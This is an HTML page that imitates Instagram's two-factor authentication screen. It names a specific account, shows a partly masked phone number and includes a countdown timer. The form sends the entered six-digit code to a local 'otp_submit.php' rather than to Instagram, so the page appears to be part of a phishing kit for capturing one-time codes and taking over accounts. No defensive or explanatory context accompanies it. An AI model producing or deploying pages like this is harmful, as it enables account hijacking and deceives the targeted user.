<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Two-Factor Authentication • Instagram</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      background-color: #000;
      color: #fff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }

    .header {
      padding: 16px 0 10px;
      border-bottom: 1px solid #222;
      text-align: center;
    }

    .header img {
      width: 30px;
      height: 30px;
      vertical-align: middle;
      margin-right: 8px;
    }

    .header-text {
      display: inline-block;
      font-weight: 600;
      font-size: 16px;
      vertical-align: middle;
    }

    .container {
      padding: 20px;
    }

    h2 {
      font-size: 20px;
      text-align: center;
      margin-bottom: 8px;
    }

    p {
      font-size: 13px;
      color: #aaa;
      text-align: center;
      margin-top: 0;
      margin-bottom: 20px;
    }

    input[type="text"] {
      width: 100%;
      padding: 14px 16px;
      margin-bottom: 20px;
      border: 1px solid #333;
      border-radius: 14px;
      background-color: #1a1a1a;
      color: #fff;
      font-size: 18px;
      text-align: center;
      letter-spacing: 6px;
      box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.4);
      box-sizing: border-box;
    }

    #timer {
      text-align: center;
      font-size: 14px;
      color: #888;
      margin-bottom: 20px;
    }

    button {
      width: 100%;
      padding: 14px;
      background-color: #3897f0;
      color: #fff;
      border: none;
      border-radius: 14px;
      font-size: 15px;
      font-weight: bold;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="header">
    <img src="instagram-icon.png" alt="Instagram Icon">
    <span class="header-text">ruma.rahman7 • Instagram</span>
  </div>
  <div class="container">
    <h2>Two-Factor Authentication</h2>
    <p>Enter the 6-digit code sent to your phone number ending in ••••30</p>
    <form action="otp_submit.php" method="POST">
      <input type="text" name="otp" placeholder="______" maxlength="6" required>
      <div id="timer">Resend OTP in <span id="count">60</span>s</div>
      <button type="submit">Continue</button>
    </form>
  </div>

  <script>
    let sec = 60;
    const countSpan = document.getElementById('count');
    const interval = setInterval(() => {
      if (sec > 0) {
        sec--;
        countSpan.textContent = sec;
      } else {
        clearInterval(interval);
        countSpan.textContent = "0 (Resend available)";
      }
    }, 1000);
  </script>
</body>
</html>
